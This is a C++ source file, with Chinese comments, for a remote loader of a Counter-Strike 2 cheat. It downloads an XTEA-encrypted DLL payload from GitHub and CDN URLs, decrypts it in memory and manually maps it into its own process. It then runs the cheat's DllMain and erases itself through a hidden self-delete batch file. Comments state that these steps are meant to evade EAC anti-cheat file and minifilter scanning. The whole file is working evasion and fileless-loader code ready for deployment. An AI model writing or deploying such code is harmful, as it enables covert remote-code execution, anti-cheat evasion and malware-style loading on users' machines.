// ============================================================
// loader.cpp �?远程加载 Stager
//
// 架构:
//   1. WinHTTP 从服务器下载加密 Payload
//   2. 内存�?XTEA+CBC 解密
//   3. 使用 ManualMapper 映射 DLL 到当前进�?
//   4. 调用 DllMain(DLL_PROCESS_ATTACH)
//   5. 自删�?(规避 EAC 文件扫描)
//
// 磁盘上仅短暂存在 loader.exe 本身 (启动后立即自删除),
// Payload 全程在内存中, 不落盘�?
// ============================================================

#include <windows.h>
#include <winhttp.h>
#include <cstdint>
#include <cstdio>
#include <vector>
#include <string>

// ============================================================
// 配置�?(部署时修�?
// ============================================================

// Payload 下载地址 �?部署时替换为你的服务�?URL
// �?CDN 备�?(国内网络可能无法直连 raw.githubusercontent.com)
static const wchar_t* PAYLOAD_URLS[] = {
    L"https://raw.githubusercontent.com/heruixii/cs2-remote-loader/57f8532/payload.dat",
    L"https://cdn.jsdelivr.net/gh/heruixii/cs2-remote-loader@57f8532/payload.dat",
    L"https://cdn.statically.io/gh/heruixii/cs2-remote-loader@57f8532/payload.dat",
};
static const int PAYLOAD_URL_COUNT = sizeof(PAYLOAD_URLS) / sizeof(PAYLOAD_URLS[0]);

// 下载超时 (毫秒)
static const DWORD DOWNLOAD_TIMEOUT_MS = 30000;

// ============================================================
// XTEA 解密 (�?encrypt.cpp 配套)
// ============================================================

static constexpr uint32_t XTEA_DELTA = 0x9E3779B9;
static constexpr uint32_t XTEA_KEY[4] = {
    0x7B2E1A4F, 0xC9D83560, 0x4A1F93E7, 0xE8056B2C
};

static void XteaDecryptBlock(uint32_t& v0, uint32_t& v1) {
    uint32_t sum = 0xC6EF3720; // 32 * DELTA
    for (int i = 0; i < 32; i++) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + XTEA_KEY[(sum >> 11) & 3]);
        sum -= XTEA_DELTA;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + XTEA_KEY[sum & 3]);
    }
}

static void XteaDecryptCBC(uint8_t* data, size_t size) {
    uint32_t iv0 = 0xDEADBEEF;
    uint32_t iv1 = 0xCAFEBABE;

    auto* blocks = reinterpret_cast<uint32_t*>(data);
    size_t numBlocks = size / 4;

    for (size_t i = 0; i < numBlocks; i += 2) {
        uint32_t saved0 = blocks[i];
        uint32_t saved1 = blocks[i+1];

        XteaDecryptBlock(blocks[i], blocks[i+1]);

        blocks[i]   ^= iv0;
        blocks[i+1] ^= iv1;

        iv0 = saved0;
        iv1 = saved1;
    }
}

// ============================================================
// HTTP 下载
// ============================================================

static std::vector<uint8_t> DownloadPayload(const wchar_t* url) {
    std::vector<uint8_t> result;

    // 解析 URL
    URL_COMPONENTS urlComp = {};
    urlComp.dwStructSize = sizeof(urlComp);

    wchar_t hostName[256] = {};
    wchar_t urlPath[1024] = {};
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = 1024;

    if (!WinHttpCrackUrl(url, 0, 0, &urlComp)) {
        return result;
    }

    // 确定是否使用 HTTPS
    bool isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);

    HINTERNET hSession = WinHttpOpen(
        L"Loader/1.0",
        isHttps ? WINHTTP_ACCESS_TYPE_DEFAULT_PROXY : WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) return result;

    HINTERNET hConnect = WinHttpConnect(
        hSession, hostName, urlComp.nPort, 0);

    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return result;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", urlPath, nullptr,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        isHttps ? WINHTTP_FLAG_SECURE : 0);

    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return result;
    }

    // 设置超时
    WinHttpSetTimeouts(hRequest,
        DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS,
        DOWNLOAD_TIMEOUT_MS, DOWNLOAD_TIMEOUT_MS);

    // 发送请�?
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, nullptr)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return result;
    }

    // 读取响应
    DWORD bytesAvailable = 0;
    while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
        size_t oldSize = result.size();
        result.resize(oldSize + bytesAvailable);
        DWORD bytesRead = 0;
        if (!WinHttpReadData(hRequest, result.data() + oldSize,
                             bytesAvailable, &bytesRead)) {
            result.clear();
            break;
        }
        result.resize(oldSize + bytesRead);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

// ============================================================
// 自删�?�?启动批处理延迟删除自身文�?
// ============================================================

static void SelfDelete() {
    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(nullptr, selfPath, MAX_PATH);

    wchar_t batPath[MAX_PATH];
    GetTempPathW(MAX_PATH, batPath);
    wcscat_s(batPath, L"~cln.bat");

    // 写入自删除批处理
    HANDLE hBat = CreateFileW(batPath, GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (hBat != INVALID_HANDLE_VALUE) {
        const char* batContent =
            "@echo off\r\n"
            ":retry\r\n"
            "del /f \"%~1\" 2>nul\r\n"
            "if exist \"%~1\" goto retry\r\n"
            "del /f \"%~0\" 2>nul\r\n";
        DWORD written;
        WriteFile(hBat, batContent, static_cast<DWORD>(strlen(batContent)),
                  &written, nullptr);
        CloseHandle(hBat);

        // 以隐藏窗口启�?
        wchar_t cmdLine[512];
        swprintf_s(cmdLine, L"/c \"\"%s\" \"%s\"\"", batPath, selfPath);
        ShellExecuteW(nullptr, L"open", L"cmd.exe", cmdLine, nullptr, SW_HIDE);
    }
}

// ============================================================
// 最小化 PE 手动映射�?(不依�?stealth_lib, 独立实现)
//
// 纯内存操�? download �?decrypt �?VirtualAlloc manual map
// 不写磁盘 �?规避 EAC minifilter 文件系统监控
// VAD伪装交由 payload 端的 SelfCloaker 处理
// ============================================================

struct MinimalMapResult {
    bool     success;
    uint8_t* imageBase;
    size_t   imageSize;
    FARPROC  entryPoint;
};

#define SECTION_MAP_EXECUTE    0x0008
// 全程纯内存操�? download �?decrypt �?VirtualAlloc manual map
// VAD伪装交由 payload 端的 SelfCloaker 处理
// (已移�?SEC_IMAGE 磁盘路径 �?规避 EAC minifilter)

static MinimalMapResult MinimalManualMap(const uint8_t* dllData, size_t dllSize) {
    MinimalMapResult result = {};

    // --- 1. 校验 PE 签名 ---
    if (dllSize < sizeof(IMAGE_DOS_HEADER)) return result;
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(dllData);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return result;

    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        dllData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return result;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return result;

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    uintptr_t preferredBase = nt->OptionalHeader.ImageBase;

    // --- 2. 纯内�?VirtualAlloc (无磁盘写�? 规避 EAC minifilter) ---
    auto* imageBase = reinterpret_cast<uint8_t*>(
        VirtualAlloc(nullptr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!imageBase) return result;

    // --- 3. 复制 PE 头和区段 ---
    DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;
    memcpy(imageBase, dllData, headerSize);

    auto* firstSection = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (firstSection[i].SizeOfRawData > 0) {
            memcpy(imageBase + firstSection[i].VirtualAddress,
                   dllData + firstSection[i].PointerToRawData,
                   firstSection[i].SizeOfRawData);
        }
    }

    // --- 4. 基址重定�?---
    uintptr_t delta = reinterpret_cast<uintptr_t>(imageBase) - preferredBase;
    if (delta != 0) {
        auto& relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.VirtualAddress && relocDir.Size) {
            auto* reloc = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                imageBase + relocDir.VirtualAddress);
            auto* relocEnd = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                imageBase + relocDir.VirtualAddress + relocDir.Size);

            while (reloc < relocEnd && reloc->SizeOfBlock) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                auto* entries = reinterpret_cast<const WORD*>(reloc + 1);
                for (DWORD j = 0; j < count; j++) {
                    if ((entries[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                        auto* patch = reinterpret_cast<uintptr_t*>(
                            imageBase + reloc->VirtualAddress + (entries[j] & 0xFFF));
                        *patch += delta;
                    }
                }
                reloc = reinterpret_cast<const IMAGE_BASE_RELOCATION*>(
                    reinterpret_cast<const uint8_t*>(reloc) + reloc->SizeOfBlock);
            }
        }
    }

    // --- 5. 导入表解�?(预加载loader目录下的 pthread DLL) ---
    wchar_t loaderDir[MAX_PATH];
    GetModuleFileNameW(nullptr, loaderDir, MAX_PATH);
    wchar_t* lastSlash = wcsrchr(loaderDir, L'\\');
    if (lastSlash) *(lastSlash + 1) = L'\0';

    static const wchar_t* preloadDlls[] = { L"libwinpthread-1.dll" };
    for (const auto* dll : preloadDlls) {
        wchar_t fullPath[MAX_PATH];
        wcscpy_s(fullPath, loaderDir);
        wcscat_s(fullPath, dll);
        if (!LoadLibraryW(fullPath)) {
            LoadLibraryW(dll);
        }
    }

    auto& importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress && importDir.Size) {
        auto* importDesc = reinterpret_cast<const IMAGE_IMPORT_DESCRIPTOR*>(
            imageBase + importDir.VirtualAddress);

        for (int i = 0; importDesc[i].Name; i++) {
            auto dllName = reinterpret_cast<const char*>(
                imageBase + importDesc[i].Name);
            HMODULE hMod = LoadLibraryA(dllName);
            if (!hMod) hMod = GetModuleHandleA(dllName);
            if (!hMod) continue;

            auto* thunk = reinterpret_cast<uintptr_t*>(
                imageBase + importDesc[i].FirstThunk);
            auto* origThunk = reinterpret_cast<uintptr_t*>(
                imageBase + (importDesc[i].OriginalFirstThunk
                    ? importDesc[i].OriginalFirstThunk
                    : importDesc[i].FirstThunk));

            for (int j = 0; origThunk[j]; j++) {
                if (origThunk[j] & IMAGE_ORDINAL_FLAG64) {
                    thunk[j] = reinterpret_cast<uintptr_t>(
                        GetProcAddress(hMod, MAKEINTRESOURCEA(
                            origThunk[j] & 0xFFFF)));
                } else {
                    auto* importByName = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(
                        imageBase + origThunk[j]);
                    thunk[j] = reinterpret_cast<uintptr_t>(
                        GetProcAddress(hMod, importByName->Name));
                }
            }
        }
    }

    // --- 6. 设置区段保护 ---
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD prot = PAGE_READWRITE;
        DWORD ch = firstSection[i].Characteristics;
        if (ch & IMAGE_SCN_MEM_EXECUTE)
            prot = (ch & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        else if (!(ch & IMAGE_SCN_MEM_WRITE))
            prot = PAGE_READONLY;
        if (firstSection[i].Misc.VirtualSize > 0) {
            DWORD oldProt;
            VirtualProtect(imageBase + firstSection[i].VirtualAddress,
                           firstSection[i].Misc.VirtualSize, prot, &oldProt);
        }
    }

    auto entryRVA = nt->OptionalHeader.AddressOfEntryPoint;
    result.success = true;
    result.imageBase = imageBase;
    result.imageSize = imageSize;
    result.entryPoint = reinterpret_cast<FARPROC>(imageBase + entryRVA);
    return result;
}

// ============================================================
// 主入�?(WinMain �?无控制台窗口)
// ============================================================

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // --- 0. 启动后立即自删除 (规避 EAC 磁盘扫描) ---
    SelfDelete();

    // --- 1. 下载 Payload (�?CDN 逐个尝试) ---
    std::vector<uint8_t> encryptedData;
    for (int i = 0; i < PAYLOAD_URL_COUNT; i++) {
        encryptedData = DownloadPayload(PAYLOAD_URLS[i]);
        if (encryptedData.size() >= 8) break;
    }

    if (encryptedData.size() < 8) {
        return 1; // 下载失败, 静默退�?
    }

    // --- 2. 解密 Payload ---
    uint32_t originalSize = *reinterpret_cast<uint32_t*>(encryptedData.data());
    size_t encryptedPayloadSize = encryptedData.size() - sizeof(uint32_t);

    if (originalSize == 0 || originalSize > 100 * 1024 * 1024) {
        return 2;
    }

    uint8_t* payloadBuf = encryptedData.data() + sizeof(uint32_t);

    // XTEA CBC 解密 (原地)
    XteaDecryptCBC(payloadBuf, encryptedPayloadSize);

    // --- 3. ManualMap 到当前进�?---
    auto mapResult = MinimalManualMap(payloadBuf, originalSize);
    if (!mapResult.success) {
        return 3;
    }

    // --- 4. 调用 DllMain(DLL_PROCESS_ATTACH) ---
    // DllMain 在当前线程上直接运行 CheatMainLoop (不创建额外线�?,
    // 从此处开�?loader.exe 进程进入无限循环, 永不返回
    using DllMainFn = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
    auto dllMain = reinterpret_cast<DllMainFn>(mapResult.entryPoint);
    dllMain(reinterpret_cast<HINSTANCE>(mapResult.imageBase),
            DLL_PROCESS_ATTACH, nullptr);

    return 0;
}
